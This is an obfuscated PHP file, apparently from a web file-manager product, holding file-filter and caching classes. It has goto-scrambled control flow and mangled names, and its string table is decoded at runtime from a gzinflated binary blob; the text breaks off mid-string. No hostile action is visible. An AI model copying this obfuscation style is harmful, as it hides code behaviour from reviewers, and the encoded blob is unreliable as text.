$a¨®‡´ªÓÚ =& $_SERVER[Äº¡•ô™Ÿ]; $Dïê‰ÂÉ“¼ = $BµôĞ’ï[$a¨®‡´ªÓÚ[75]]; if (in_array($BµôĞ’ï[$a¨®‡´ªÓÚ[415]], $A¬±ÑÎô±)) { return !1; } goto fÊêÎ¥ğ‚œ; fÊêÎ¥ğ‚œ: if (!in_array($BµôĞ’ï[$a¨®‡´ªÓÚ[746]], $eË„¯ßŞ‹)) { return !1; } if (IO::exist($Dïê‰ÂÉ“¼)) { return !0; } $c‡‚»§ÙÅ¨ = get_path_father($Dïê‰ÂÉ“¼); goto b®çè—Ş¯; b®çè—Ş¯: if (IO::exist($c‡‚»§ÙÅ¨)) { $A¬±ÑÎô±[] = $BµôĞ’ï[$a¨®‡´ªÓÚ[415]]; return !1; } $fãÔ†“„ãÖ = array($a¨®‡´ªÓÚ[746] => $BµôĞ’ï[$a¨®‡´ªÓÚ[746]], $a¨®‡´ªÓÚ[75] => array($a¨®‡´ªÓÚ[754], "{$c‡‚»§ÙÅ¨}\45")); $bÀò¸øˆà± = Model($a¨®‡´ªÓÚ[722])->where($fãÔ†“„ãÖ)->field($a¨®‡´ªÓÚ[416])->select(); goto BËäó¢·Á ; BÒ¡¼Ò•ÕÃ: } private function _fileFilter($DÁº¬•ê„²) { $c¤ö¬”„ =& $_SERVER[Äº¡•ô™Ÿ]; if (empty($DÁº¬•ê„²)) { return; } $D›ó˜è«ñ  = array($c¤ö¬”„[415] => array($c¤ö¬”„[7], array_unique($DÁº¬•ê„²))); $eÃ§‚ÀˆìÁ = Model($c¤ö¬”„[755])->where($D›ó˜è«ñ )->field($c¤ö¬”„[366])->select(); foreach ($eÃ§‚ÀˆìÁ as $b™¾¨›Àª¦) { Model($c¤ö¬”„[755])->remove($b™¾¨›Àª¦[$c¤ö¬”„[366]], !1); } } private function storeIds() { $F»á›óÛšŠ =& $_SERVER[Äº¡•ô™Ÿ]; $dÈ …†Û ç = Model($F»á›óÛšŠ[707])->listData(); return array_to_keyvalue($dÈ …†Û ç, $F»á›óÛšŠ[33], $F»á›óÛšŠ[364]); } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto a¼®¦ä–È¿; a¼®¦ä–È¿: $D›ñ¼²ÃÔò =& $_SERVER[Äº¡•ô™Ÿ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto a¢¹Ÿ´Ã‘İ; D¿„àæÆİ: switch ($C•Ÿå«ŞÍ™[$D›ñ¼²ÃÔò[756]]) { case $D›ñ¼²ÃÔò[17]: self::$handle = Model($D›ñ¼²ÃÔò[758]); break; case $D›ñ¼²ÃÔò[759]: self::$handle = new CacheRedis($CØ‚°ç•½‹, $D­“È„«Ä); break; case $D›ñ¼²ÃÔò[760]: self::$handle = new CacheMemcached($CØ‚°ç•½‹, $D­“È„«Ä); break; case $D›ñ¼²ÃÔò[164]: self::$handle = new CacheFile($CØ‚°ç•½‹, $D­“È„«Ä); break; default: break; } return self::$handle; goto BéÄÆîÆ¼¿; a¢¹Ÿ´Ã‘İ: $C•Ÿå«ŞÍ™ = $GLOBALS[$D›ñ¼²ÃÔò[6]][$D›ñ¼²ÃÔò[334]]; $CØ‚°ç•½‹ = $C•Ÿå«ŞÍ™[$C•Ÿå«ŞÍ™[$D›ñ¼²ÃÔò[756]]]; $D­“È„«Ä = $C•Ÿå«ŞÍ™[$D›ñ¼²ÃÔò[757]]; goto D¿„àæÆİ; BéÄÆîÆ¼¿: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($EÅ®İêÅŞß) { if (is_array($EÅ®İêÅŞß) || is_object($EÅ®İêÅŞß)) { $EÅ®İêÅŞß = json_encode($EÅ®İêÅŞß); } $EÅ®İêÅŞß = rawurlencode($EÅ®İêÅŞß); return KOD_SITE_ID . $_SERVER[Äº¡•ô™Ÿ][70] . $EÅ®İêÅŞß; } public static function get($eáÀÊí¥) { $Eù¼½öŸ² = self::key($eáÀÊí¥); if (!isset(self::$memoryCache[$Eù¼½öŸ²])) { CacheLock::lock($eáÀÊí¥); $E‘·ÜĞÖÔ  = self::init()->get($Eù¼½öŸ²); CacheLock::unlock($eáÀÊí¥); self::$memoryCache[$Eù¼½öŸ²] = unserialize($E‘·ÜĞÖÔ ); } return self::$memoryCache[$Eù¼½öŸ²]; } public static function set($añÀÆÍƒØ¤, $A‡ÁáËÃ¼Ó, $FŸñèª§İî = false) { goto cæ¨ŒÁÕ„; F÷ÑõŒ­: CacheLock::unlock($añÀÆÍƒØ¤); return $Cºº±Ÿì…; goto a„“Í÷‹ÉÏ; dÊ´ÒÑëİ‚: CacheLock::lock($añÀÆÍƒØ¤); $Cºº±Ÿì… = self::init()->set($D…Ñ›…‹»†, serialize($A‡ÁáËÃ¼Ó), $FŸñèª§İî); self::$memoryCache[$D…Ñ›…‹»†] = $A‡ÁáËÃ¼Ó; goto F÷ÑõŒ­; cæ¨ŒÁÕ„: $D…Ñ›…‹»† = self::key($añÀÆÍƒØ¤); if (isset(self::$memoryCache[$D…Ñ›…‹»†]) && self::$memoryCache[$D…Ñ›…‹»†] === $A‡ÁáËÃ¼Ó) { return !0; } if ($FŸñèª§İî === 0) { self::$memoryCache[$D…Ñ›…‹»†] = $A‡ÁáËÃ¼Ó; return !0; } goto dÊ´ÒÑëİ‚; a„“Í÷‹ÉÏ: } public static function remove($dÏÑ‹­àØõ) { goto EîŒ¸¼ì¶É; F¸¬„ÑÑ¯: CacheLock::lock($dÏÑ‹­àØõ); $aº“—Ë³ùÁ = self::init()->remove($c§µ‘Ôî„); CacheLock::unlock($dÏÑ‹­àØõ); goto eçÄ‘Â‚Ø; EîŒ¸¼ì¶É: $c§µ‘Ôî„ = self::key($dÏÑ‹­àØõ); unset(self::$memoryCache[$c§µ‘Ôî„]); self::clearTimeout(); goto F¸¬„ÑÑ¯; eçÄ‘Â‚Ø: return $aº“—Ë³ùÁ; goto C‘«õå”’Ó; C‘«õå”’Ó: } public static function clearMemory($DêÊÉŒÇ = false) { if ($DêÊÉŒÇ) { $DêÊÉŒÇ = self::key($DêÊÉŒÇ); unset(self::$memoryCache[$DêÊÉŒÇ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Äº¡•ô™Ÿ][761])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Äº¡•ô™Ÿ][762])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($føŠ¹šÊ·å, $f‚İÎ¶) { $d§¾­±ö«§ =& $_SERVER[Äº¡•ô™Ÿ]; $this->cachePath = $føŠ¹šÊ·å[$d§¾­±ö«§[75]]; $this->prefix = $d§¾­±ö«§[763]; $this->cacheTime = $f‚İÎ¶; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($fë…åÓ²‡¶) { $DÍôñùñ =& $_SERVER[Äº¡•ô™Ÿ]; $fë…åÓ²‡¶ = str_replace(array($DÍôñùñ[764], $DÍôñùñ[95], $DÍôñùñ[69]), $DÍôñùñ[765], $fë…åÓ²‡¶); return $this->cachePath . $DÍôñùñ[766] . $fë…åÓ²‡¶ . $DÍôñùñ[767]; } public function set($a÷ğ„ÊÜ«, $d×Éáè„í, $Eòòììçí = false) { $Fô¢îï×ÁÌ = $this->getFile($a÷ğ„ÊÜ«); if (file_put_contents($Fô¢îï×ÁÌ, $this->prefix . $d×Éáè„í, LOCK_EX)) { return !0; } @unlink($Fô¢îï×ÁÌ); return !1; } public function get($C‰İ—‰—¸¹) { $c›Ø—Ï¡ó’ = $this->getFile($C‰İ—‰—¸¹); if (file_exists($c›Ø—Ï¡ó’) && filemtime($c›Ø—Ï¡ó’) < time() - $this->cacheTime) { @unlink($c›Ø—Ï¡ó’); return !1; } $d„œ˜ã´¹¼ = @file_get_contents($c›Ø—Ï¡ó’); return substr($d„œ˜ã´¹¼, strlen($this->prefix)); } public function remove($EèíĞ½²­) { $CõïåéøÅŸ = $this->getFile($EèíĞ½²­); return @unlink($CõïåéøÅŸ); } public function deleteAll() { $CÚöƒ¯Éæ» =& $_SERVER[Äº¡•ô™Ÿ]; $eÎÂËòóƒ = scandir($this->cachePath); foreach ($eÎÂËòóƒ as $dßêÛš›ã) { $CÎ“ŠÔñ±¦ = $this->cachePath . $dßêÛš›ã; if (strpos($CÎ“ŠÔñ±¦, $CÚöƒ¯Éæ»[767]) && strpos($CÎ“ŠÔñ±¦, $CÚöƒ¯Éæ»[768])) { @unlink($CÎ“ŠÔñ±¦); } } } public function clearTimeout() { $a·™à…´í =& $_SERVER[Äº¡•ô™Ÿ]; $D¤–é¥›Ÿè = scandir($this->cachePath); foreach ($D¤–é¥›Ÿè as $a÷ïÀ¯‰«Ò) { $BÉÄË‡Ü…‡ = $this->cachePath . $a÷ïÀ¯‰«Ò; if (strpos($BÉÄË‡Ü…‡, $a·™à…´í[767]) && strpos($BÉÄË‡Ü…‡, $a·™à…´í[768]) && filemtime($BÉÄË‡Ü…‡) < time() - $this->cacheTime) { @unlink($BÉÄË‡Ü…‡); } } } } goto Aè±ªÇÅ¤Ì; cğ¶ñë„È”: if (!function_exists('_kodDe')) { function _kodDe($b¿®¶âÊœ) { $b¿®¶âÊœ = base64_decode($b¿®¶âÊœ); $a˜‘è’¾Íã = strlen($b¿®¶âÊœ); $e§ôÁø = ''; $Cå½½Ú÷¶› = ord($b¿®¶âÊœ[0]) - 30; for ($dªÜöãì‰Ã = 1; $dªÜöãì‰Ã < $a˜‘è’¾Íã; $dªÜöãì‰Ã += 2) { if ($dªÜöãì‰Ã + 1 < $a˜‘è’¾Íã) { $e§ôÁø .= chr(ord($b¿®¶âÊœ[$dªÜöãì‰Ã + 1]) + $Cå½½Ú÷¶›); $e§ôÁø .= chr(ord($b¿®¶âÊœ[$dªÜöãì‰Ã]) + $Cå½½Ú÷¶›); } else { $e§ôÁø .= chr(ord($b¿®¶âÊœ[$dªÜöãì‰Ã]) + $Cå½½Ú÷¶›); } } return $e§ôÁø; } } define("\304\272\241\225\364\231\237", "\367\202\263\327\361\251\256"); $_SERVER[Äº¡•ô™Ÿ] = explode("\x7c\x1\x7c\x5\x7c\x6", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\175\11\174\33\305\365\160\240\224\2\345\156\313\135\130\114\102\154\107\207\257\70\211\23\333\221\55\331\126\142\133\212\44\307\11\226\243\254\244\225\264\261\244\225\167"."\x57\xf2\x91\x4\x3e\xca\xd1\x72\x84\x23\x84\x70\xb7\x10\x28\x50\xa\x84\x0\xe1\x2a\x67\xcb\x4d\x39\xdb\x52\x8e\x42\x29\x90\x84\x23\x85\x12\xa0\x5c\x2d\x7c\x73\xcf\xec\x4a\xa6\xed\x9f\x1f\xb1\x66\xde\xbc\x99\x9d\xe3\xcd\x9b".base64_decode('NzPvvbnwiXu2/PTqM955e81ua767Zs83n8S/4O8e6C8IH3PWXtPQf9/JLXmof/f6A9ed8dEbg4U=')."\135\111\351\243\376\175\367\172\362\10\345\214\305\321\246\343\373\324\357\335\161\325\355\175\257\256\173\370\37\37\335\374\173\307\157\16\166\135\361\331\13\23\215\132\352\245\257\343\47\335\375\300\344\326\203\233"."\x3a\xe4\xa7\x17\xdd\x74\xd0\xe2\xa3\xbf\x58\xff\xbd\x85\x2f\xfe\xee\xb9\x47\xde\x30\xef\x5e\xba\xe7\x47\x37\x9e\x76\xb7\x31\x3c\x38\x77\xfa\xab\xd7\x7e\xb0\xdb\x8b\x33\x4e\xdd\x7e\x6c\x93\x3a\xf0\xec\x3b\x37\xbd\xf8\xc6\xea"."\x6f\x86\xae\x78\xfb\xc2\x9f\x9f\xf9\xa7\xa7\xef\xaf\xfe\xe8\x88\xef\x8c\x6b\xad\x1d\x6b\xb4\xba\x4f\xfc\x47\x3f\x38\x76\xe1\xf9\xb7\x5c\x1d\x73\xed\x71\x6a\xdd\x9d\x47\xd6\x6d\x38\x78\x9f\xe7\x2e\x7d\x68\xff\x3d\x76\xf5\xbf"."\266\371\340\177\177\41\255\170\270\147\343\246\127\176\342\74\356\351\275\266\334\162\360\107\177\30\77\161\323\175\233\177\172\341\163\67\36\272\244\331\157\374\363\362\137\206\233\373\166\144\357\355\351\371\315\251".base64_decode('F3563o+UDf+8LHX0/re+ffLTe368966Lko93PXHk+sduuOaDsy9rffsvRyrv/Hz5J4vO+/Ov1i0=')."\x3a\xef\xfc\x83\xe6\x1e\xf0\x93\x6e\xe9\xc3\x3b\xf\x3b\x2c\x56\xb3\xdf\x63\xb7\xfd\x73\xfc\xf0\x9b\xee\x88\x36\x7f\xef\x8b\xe8\xdc\x99\x1f\xbc\xfe\x9d\x67\xdb\xbf\xcc\xf5\x5d\x7b\xe2\x1b\x7f\xd9\xc3\x99\xd8\x2d\xbe\x35\xbd"."\233\253\166\144\331\103\353\156\174\346\244\176\343\260\137\315\310\266\114\277\375\374\165\27\76\171\364\314\75\356\177\172\255\162\350\232\365\137\357\376\356\173\257\257\375\353\356\323\246\341\236\156\301\77\122\136".base64_decode('MyVlXDVMAwMSWj6lpnFYzeNfN/4xRrOqqeBwrD8QiYUHgkFfKBIjJYrpOS1JQgVZl3Ok8IKiG+A=').base64_decode('U2JxsYJWUPIWCAckZVOOywYpydsR8/qCvYHlscjyoI9gxGOjRUWfwDEUDJuybkbUnMIwxnRWrw4=')."\x5f\xb7\xbf\x5f\x8a\x84\x3c\xfd\x61\x4f\x67\xc4\x1f\xe8\xc7\xe0\xce\x40\x5f\x9f\x3f\x52\xe\xf\x5\x7a\x7b\x3b\x3c\x9d\x8b\xcb\x53\x82\x21\x4f\x77\x9f\x47\x2\xf5\xcb\x2a\x31\x35\x9f\xd2\xaa\xa5\x95\x38\x65\xa5\x54\x83\x3"."\135\252\222\115\342\140\136\246\325\61\47\12\44\24\141\41\60\6\371\142\66\213\43\375\54\104\352\257\244\344\142\226\364\231\127\214\24\164\65\47\323\246\57\126\46\30\24\7\344\242\251\251\371\4\216\370"."\xc6\x4d\x5d\xe6\x70\x50\xe3\x84\xae\xe4\x94\x3c\x29\x2a\xec\xeb\xf5\x75\x46\x24\x58\x4d\xa9\x2b\x14\xe8\x93\xc8\x50\xe4\x64\xc3\x54\x74\x69\xb0\xc7\x17\xf2\x49\xb0\xea\xad\x33\x51\x8b\x67\x4a\x38\xdf\x40\x3f\xe8\x10\xc9\xd3"."\xdb\x2b\x4d\x55\x82\xa9\xe4\xa\xb4\x18\x9c\xa7\x42\x61\x81\x90\xd7\x17\x92\x3a\x96\x4b\xbc\x9f\x12\x5a\x2e\xa7\xe5\x5d\xa0\x14\x30\x9e\xa6\x50\x55\x5f\x28\x84\x3\xe\x42\xc1\xbd\x7e\x38\x74\x24\x12\xe8\xea\xa\xfb\x58\x8c".base64_decode('NG5JL6hJI6FSSyyZypqxkpwtUmIdwb8zyQ/51QxCwKNqXi0SYiVFaBqbOSRQpNgKheRANo3MKTA=')."\301\112\70\330\332\206\177\347\23\244\170\14\246\51\272\31\123\362\11\55\251\346\311\64\154\47\123\216\20\236\154\146\274\272\12\360\110\201\232\53\241\25\46\372\264\22\151\103\112\315\52\275\154\226\245\264"."\154\122\321\171\274\0\262\213\51\244\61\352\244\220\273\277\230\23\121\130\64\221\121\263\111\235\116\316\157\303\254\47\305\52\246\11\232\141\320\232\16\24\262\232\234\14\53\272\120\373\56\120\114\240\150\212"."\xc0\x22\x42\xeb\xd2\xf4\x9c\x17\x30\x0\xd2\x3b\x80\xec\xd5\x81\xa\x9\x23\x94\xf0\x93\x42\xa7\xe0\x12\xe8\xe0\x75\x66\x8a\xf9\x91\x30\x6b\xa2\x8b\x70\xb5\xea\xa1\x93\x9d\x5f\xf\xf\x2d\x4\x7f\x6a\x8\x8b\x8b\x92\x7a\x67"."\224\154\66\246\214\53\144\366\344\222\263\15\332\64\267\21\127\363\156\0\301\121\177\40\226\221\215\114\137\162\166\14\345\242\234\63\251\214\273\12\231\2\231\340\154\116\23\262\206\243\320\257\231\76\201\361"."\146\265\204\114\220\62\246\131\10\53\371\44\354\32\322\66\155\54\217\272\256\240\50\244\131\136\207\224\224\372\244\345\122\117\213\332\102\351\14\120\115\152\202\363\276\214\231\143\105\346\150\323\30\314\140\100"."\163\234\120\107\25\211\53\343\46\351\21\151\176\42\43\353\140\40\133\213\146\312\71\227\260\220\102\41\253\46\144\123\325\362\156\55\141\52\246\323\60\165\105\46\245\125\315\227\40\155\300\271\134\213\163\321".strrev('Ië†R¼ÕgÍ_¿[âğ2\')¦É"Ó?'."\n".'†h(Õ^h£/S H·¡úwE)Î]‘0Må©Ôy')."\x24\x14\xc3\x70\xc2\x2c\xba\x96\x75\x7a\xb2\x59\x6d\xcc\x19\xd0\xd5\xb4\xa\xf2\xd4\xda\xaa\x9\x78\x54\x8b\x44\x19\x68\x41\xd5\x15\x83\x46\xa5\xee\xbe\x8\x41\x6\xb5\x52\x9c\x41\x5d\x4e\xe7\xe4\x16\xa9\x50\x8c\x83\x9e\x21"."\63\265\2\14\143\223\257\267\110\11\30\165\110\271\242\141\72\165\5\60\42\25\54\171\144\360\374\51\147\37\34\117\125\111\72\303\200\137\23\160\143\135\223\4\110\107\242\151\30\332\23\211\4\143\376\56"."\260\54\367\373\142\175\236\110\147\17\251\266\51\247\151\235\173\1\27\146\105\122\340\62\47\230\174\220\320\372\101\37\161\140\120\33\123\164\360\341\216\211\26\151\104\113\306\265\161\27\115\202\310\160\62\121"."\x64\xd8\xa3\x5\xd3\x19\x92\xf3\x69\xd8\x3f\xf1\x9\x53\x21\xe4\x68\x94\xd2\x74\x79\x9\x2d\xf5\x85\x62\xe1\x40\x57\x64\xd0\x13\x22\x4b\x77\x1e\x74\xf9\x38\x2d\x14\x16\x92\x75\x86\x94\x24\xe8\xe4\x84\x49\x8b\x96\xb\xb0\x7f".base64_decode('KA6cEnA0aSqcJjSt198Nu8DrNACSU8SiZfeqORXW0mQpqM/Aut5NKuRGVW+NZmqro8lZNU7wt7Y=')."\146\50\352\165\325\16\267\273\125\236\307\135\357\252\227\32\352\232\245\40\20\64\124\71\53\21\172\51\303\250\223\2\213\255\24\325\253\344\323\146\206\310\136\41\337\222\1\137\70\22\353\363\105\172\2\136"."\x92\xdb\xe7\x21\xa1\x5e\xd\x4f\x30\x5a\xdb\x21\xfc\x33\x4c\xc6\x1\x2c\xfd\x69\x25\xa1\x65\x35\x5d\xce\x42\xd6\x41\xa9\x46\xa1\x53\x39\xad\xa6\x38\x9f\xf6\x3\x1\x85\x74\x1a\x66\x56\x3c\x12\x56\x73\x5\xca\x66\xcc\x4c\x31"."\x17\x17\x82\x6e\x5e\x2\x19\x51\x30\x1c\x8c\xb9\x68\x6c\x4d\xd1\x74\x12\x6a\x71\x93\x2c\x33\x1a\xba\x28\x7f\x74\x87\x1b\xc1\xff\x9c\x19\x26\xb5\x9c\x4c\x25\x4b\x34\xfd\x94\x24\x9e\x7f\x18\x54\x6b\x49\xe9\x51\x64\xbe\x48\x99".base64_decode('uqlBqG5B6VPMjEamQVqhVSqyutFaJpWsQnspo9DVAYhLJdZ5BV1JqYQmgXwE4JyXqkYIZILyCo0=')."\17\102\261\222\3\114\316\166\145\203\263\156\30\21\126\332\256\201\336\336\130\147\240\77\2\104\113\14\31\14\371\43\76\112\21\36\157\314\323\31\144\253\16\37\46\202\0\47\131\71\223\302\220\122\203\300".base64_decode('vTmb54yTrk2QMeIw4GgFLW8ozgQpLclZKMaYb+OfZTm4QDvulHOTzpxiyk5WdesqJUXE5dlPhoA=')."\xb3\xbc\x2c\x58\xe\xc1\x7e\x81\x2e\x89\xc1\x40\x98\x64\x68\x87\x50\x20\x5d\xc4\x15\x9d\xd4\x23\x38\x40\x92\x72\xc2\xf0\x77\xfb\x8\x70\x1f\xba\xc2\xc9\x44\x12\xf1\xc\x86\x29\xbb\x2a\x2\x7c\x5d\x9d\x94\x79\x1b\xdb\x69\x7d"."\110\331\343\271\54\27\230\142\252\145\374\142\132\174\25\340\120\200\350\344\112\255\166\362\261\212\364\370\373\27\307\372\2\136\137\157\314\337\17\130\140\244\34\76\20\364\172\350\340\213\360\216\100\244\307\2"."\35\0\174\142\251\247\327\157\107\367\55\363\207\43\341\212\111\0\66\340\263\245\200\55\124\60\344\353\362\57\143\321\56\277\257\327\33\216\165\172\72\173\70\116\277\247\217\104\142\51\270\211\61\334\126\374"."\30\340\346\141\266\25\212\225\340\266\216\166\146\314\262\357\210\121\211\72\306\351\4\54\101\12\241\115\322\134\270\231\104\55\41\62\156\102\53\122\152\145\162\127\216\62\210\234\114\146\250\114\227\227\152\374"."\123\43\171\302\222\131\210\61\126\20\237\140\101\324\14\32\7\202\26\371\276\104\230\157\131\15\142\20\247\103\111\151\272\362\155\0\117\312\144\204\141\213\203\171\303\323\300\10\170\320\256\25\120\2\32\221".base64_decode('GJ2LBpD3PbQ6Kb5jjAXA1toD95uxwVCgv5tkGMsotAJ+0v3VVCQh206TsyQgT8hcNKSdvkqjXbk=').strrev('‘,‹UÑfœÊq’%UÖ`¿kX1çK-5Å¯²+UL¡lÀ)îƒŒfc!Ç¯iä®>F€ÿ')."\300\142\137\177\214\122\26\216\11\324\210\1\140\13\30\10\221\16\61\265\21\272\41\301\211\41\137\230\162\1\135\31\55\252\264\273\334\256\131\204\212\25\260\376\220\317\273\127\104\307\146\125\17\71\147\271"."\206\101\240\246\166\41\216\222\130\324\145\211\116\47\371\213\72\313\15\105\220\152\243\275\246\45\352\216\272\253\333\133\206\74\316\111\331\71\131\347\234\347\34\236\25\165\325\314\42\200\341\325\15\216\246\265"."\20\1\40\266\37\67\14\176\132\243\355\63\242\316\343\117\134\271\160\50\72\74\263\145\326\261\121\327\161\321\261\341\332\232\166\372\235\104\121\7\233\255\304\4\253\152\162\126\65\250\22\20\115\30\112\36"."\261\104\1\201\46\114\252\5\16\135\335\274\226\302\301\30\52\151\236\143\310\31\235\65\334\56\344\23\100\366\157\1\321\5\360\347\14\303\363\70\117\200\55\143\131\341\274\47\364\121\314\47\70\167\205\363"."\x22\x2e\x27\x8\x1f\x50\xd3\x79\x36\x85\xc0\x82\xce\x36\xb9\x56\xd9\x77\xf5\xc\xfc\xbb\x96\xe\x64\x5a\xa1\xcb\x32\x3c\x9f\xd2\x9\x75\x16\xf3\xea\x28\xdd\xba\xe7\x95\x51\x12\xd0\x4c\x4a\xdf\x71\xc5\x1c\x53\x28\x79\x0\xb8".base64_decode('JQ6Ig264QJIQyyIhjXyBb3oUtAMgrSjEoNg1xmJJJU/GaW+CbSTkghIWWhiLRTwdvb4Y5TCEE9M=')."\x38\xe2\x8a\x1d\xec\xb0\xb\x34\x8d\x73\x54\xb6\x7b\xe4\xe2\xb0\x31\x9a\x95\x10\x33\x90\x14\x5d\xd7\xf4\x16\x74\x90\x67\x14\xb\x50\x16\x3\x7b\x1f\x13\xf4\xa7\x4\xb6\xc6\x52\x6b\x9b\x84\xbb\x99\x70\x89\x98\xd8\xe9\x5\x99".strrev('X@qŒSyÙndÂV²'."\0".'ÏÇÀ¸Ô‹üÁ?à£»*Úãuxjge€CÃ’RZ4uw$Ê_pJ')."\166\154\240\351\154\235\205\160\56\265\232\232\51\147\31\32\114\213\100\10\345\66\164\255\46\273\153\74\200\275\234\11\301\325\131\70\215\103\34\262\237\35\65\261\23\4\341\40\10\300\34\102\24\377\155\255"."\242\154\72\17\46\102\47\137\244\374\136\47\31\104\317\62\247\237\10\360\54\240\122\121\123\6\323\331\244\120\103\53\352\11\205\341\130\204\14\123\326\301\232\305\45\73\50\203\11\307\205\240\346\16\170\202"."\xe0\x80\x6b\xaa\x3\x48\x7b\xe\x78\x7e\xe3\xe0\x12\xab\x83\x1f\x4\x38\x98\xfc\xe9\x20\x62\xa9\x83\x97\x4e\x82\x7e\xaf\x43\x35\xbc\x48\x3c\x46\xe5\xa2\x24\x5a\x67\x33\x3\xb7\xd5\x59\x79\xc2\x81\xeb\xdf\xab\x94\x94\xac\x83"."\xd6\xde\x41\x1b\xe5\xa0\x2d\x70\xa0\xfd\x86\x97\xd4\x66\x0\xd0\x7\xa9\xd\xa\x2\x26\x91\x71\xc0\xe1\x80\x63\x4b\x4b\x81\x41\xda\xd\x4c\xa8\x76\x70\x81\xdb\x91\xd6\xb5\x62\x21\x48\xbf\x24\xc4\x70\x65\x8\x80\xd7\x94\x1"."\102\232\146\72\350\6\210\5\372\30\7\202\325\341\241\245\174\300\171\355\331\362\111\232\200\343\366\72\140\50\114\357\222\113\342\0\127\34\354\274\225\60\370\251\47\77\235\343\342\222\175\43\142\77\344\341"."\x9d\xc8\x2b\x11\x91\xd3\x61\xe1\xf3\xa6\x9c\xa6\xdf\xc6\xe0\x90\x92\x98\x48\xf0\x9d\x8c\x57\xd8\x1a\x59\x63\x6c\x9c\x11\xd1\x55\xa2\x9c\xca\xe3\xcc\xa8\x81\x11\xd6\x3e\x7b\xef\x4d\xc9\x98\x13\xd\xa1\x15\xb\x65\x4d\x49\xca".strrev('ñòp¡ÃA`”M¤4ùF)o[Oê'."\n".'/F2à¨$l¡Ë$Rvp'."\n".''."\n".'oÌ\'¦ìà^_y¼')."\242\344\107\325\142\270\137\143\71\266\215\140\35\155\343\74\260\337\203\152\176\102\315\213\33\165\16\345\14\216\123\0\244\145\36\303\175\74\125\30\63\22\176\20\340\40\7\4\16\260\111\34\21\130\34\337"."\320\202\332\303\254\102\335\111\111\266\232\323\331\346\264\106\371\344\33\0\173\242\30\255\15\241\132\102\244\31\131\347\275\114\47\24\244\142\326\52\3\242\360\250\200\226\222\113\234\267\133\362\10\323\300\60"."\x27\xd8\x99\x86\x10\xb4\x16\x8a\xa3\xde\xa9\x22\x3d\x6c\xab\x57\x29\x2a\xce\x3f\xd5\xe8\x5\xbd\x59\x29\x8c\x5a\x1a\xd1\x2a\x46\x91\x8\x20\x81\xc5\x9f\x9e\x77\x51\x59\x3e\x66\x3b\x53\x0\x51\x61\xa4\x62\x96\xe3\x7\x5c\xd"."\17\343\163\100\212\311\202\21\320\135\160\222\164\103\56\46\56\71\174\71\202\234\23\207\5\244\202\235\341\131\30\163\245\125\316\316\232\155\120\133\224\177\324\302\167\312\226\42\42\211\20\301\263\216\120\175"."\22\154\21\135\72\346\154\56\40\153\220\213\32\107\235\260\226\361\351\273\332\230\60\114\45\107\70\341\132\133\357\230\140\57\23\227\165\227\16\152\304\53\312\371\77\221\64\212\14\60\154\307\300\305\367\152"."\x54\xf0\x85\xf4\xef\x4b\xaa\x26\x84\x40\x6e\xa6\xd1\x13\x2a\x8e\x28\xf0\x74\x6\x13\xa\x44\x5d\xe2\x2a\x1b\x83\xac\x3a\x42\x72\x39\x66\x58\x30\x2b\x71\x72\x57\x2d\xe2\xb9\x2e\xbe\xd0\x88\xcb\x94\x78\x25\x4\xd1\x78\xcb\xe1"."\25\23\16\11\227\251\71\166\347\204\200\56\303\324\12\74\105\210\342\144\41\211\27\52\140\261\316\107\65\4\53\100\22\11\3\274\13\21\56\311\213\304\145\114\334\256\54\300\160\211\254\310\243\353\224\110"."\160\363\340\161\15\0\212\40\70\135\303\364\270\260\22\107\306\205\373\112\374\222\24\27\5\77\354\302\13\224\113\116\46\3\364\54\115\14\227\243\212\107\7\225\13\102\367\326\254\50\41\126\31\335\223\315"."\362\113\60\173\174\312\54\170\256\212\231\104\310\224\331\272\220\304\113\57\33\52\301\230\0\327\145\243\41\76\343\370\45\243\135\276\265\62\237\377\44\173\225\315\0\76\240\225\343\220\77\146\324\274\142\260".base64_decode('lUk3KvGZ/yTfWERcqyAjSjBkOeTNFbsVkv9UtADThBMksGECAHEdYccknO8ISyVadmKmZdkPoTI=')."\x84\xf9\x60\x19\x62\x30\xff\x70\x8b\xba\x74\x2d\xe7\xf\x80\xf9\x55\x99\xe8\xec\x78\xa\x3d\x28\x42\x4c\x6d\x9c\xed\xbf\xc4\x4c\x80\x48\xe0\x2a\x34\x55\x99\x34\x99\x15\xc5\x97\xac\x87\x6f\xbb\xe2\xec\x2d\x77\xfd\xb\x47\x6e"."\332\274\361\337\70\244\245\162\112\151\214\134\117\220\143\135\360\167\367\162\335\241\323\226\15\151\157\75\372\243\256\257\236\373\353\26\177\363\351\157\75\172\302\242\115\371\276\73\227\55\137\237\173\371\126\145".base64_decode('eOdr2UtnnP528BqfXq1nhi+96MrcrRM952+qec55wu1nHZI5ufnlafsd3OT5pu++0te+n17eeG8=')."\346\55\123\166\244\237\371\313\63\227\177\174\205\161\377\101\53\306\233\237\377\150\376\137\127\357\370\352\303\177\135\371\140\373\37\357\74\352\365\135\356\177\354\343\357\161\277\277\255\345\242\336\354\246\252\325".strrev('{Ù/37ùşŸ÷?¬Áı?Ò;®Îü¯uÛn?;ÇÃİxş=¢å·~l'."\r".'T×¾Ìı~[ÉÈóÆ»K?').strrev('{Æ÷8ï>éÄsï{Æyœ§U¾övPèÈ}_'."\r".'^uÌgæñ×